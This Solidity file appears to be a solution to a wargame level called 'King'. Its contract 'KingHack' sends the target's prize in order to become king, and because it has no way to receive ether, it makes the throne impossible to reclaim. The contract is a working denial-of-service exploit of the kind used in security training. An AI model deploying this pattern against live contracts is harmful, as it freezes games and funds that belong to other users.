// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external returns(uint256);
}

contract KingHack {
    constructor(address payable _king) payable {
        uint256 prize = IKing(_king).prize();
        (bool ok,) = _king.call{value: prize}("");
    }
}